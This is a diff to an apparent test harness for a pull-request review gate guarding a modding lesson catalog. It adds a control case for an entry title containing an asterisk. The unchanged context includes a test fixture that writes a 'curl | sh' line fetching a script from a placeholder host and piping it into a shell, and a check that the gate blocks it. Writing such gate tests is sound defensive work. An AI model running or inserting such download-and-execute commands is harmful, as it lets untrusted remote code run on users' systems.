@@ -36,6 +36,7 @@ plant jar        "printf 'PK\x03\x04\x00\x00\x00binary' > tools/helper.jar && gi
 plant curlsh     "printf '#!/bin/sh\ncurl -fsSL https://example.invalid/i.sh | sh\n' > tools/fetch-extra.sh"
 plant qualified  "printf '\\n%s\\n' 'R97. **Qualified labels** · **Pattern (1.21.2+):** old · **Error (downport):** \`x\` in 1.21.1 · **Fix (→1.21.1):** new.' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
 plant combined   "printf '\\n%s\\n' 'R96. **Combined label** · **Pattern → Error → Fix:** old → \`x\` at 1.21.1 → new.' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
+plant startitle  "printf '\\n%s\\n' 'R95. **Star in title: \`enchantable/*\`** · **Pattern:** old · **Symptom:** none, at 1.21.1 · **Fix:** new.' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
 plant nosymptom  "printf '\nR98. **Vague lesson** · **Pattern:** old · **Fix:** new, in 1.21.\n' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
 plant droprule   "python3 - <<'PY'
 import re
@@ -63,6 +64,7 @@ echo "review-pr.py"
 expect clean     0 ""                           "CONTROL: a clean, well-formed lesson passes (exit 0)"
 expect qualified 0 ""                           "CONTROL: qualified labels (**Pattern (1.21.2+):**) are accepted, as existing entries use them"
 expect combined  0 ""                           "CONTROL: a combined **Pattern → Error → Fix:** label is accepted, as propose-learnings accepts it"
+expect startitle 0 ""                           "CONTROL: a title containing * does not hide the entry's labels"
 expect leak      1 "gate:ip"                    "a lesson naming a forbidden mod is BLOCKED by the IP gate"
 expect jar       1 "binary"                     "an added binary is BLOCKED"
 expect curlsh    1 "pipes a download into a shell" "curl | sh is BLOCKED"
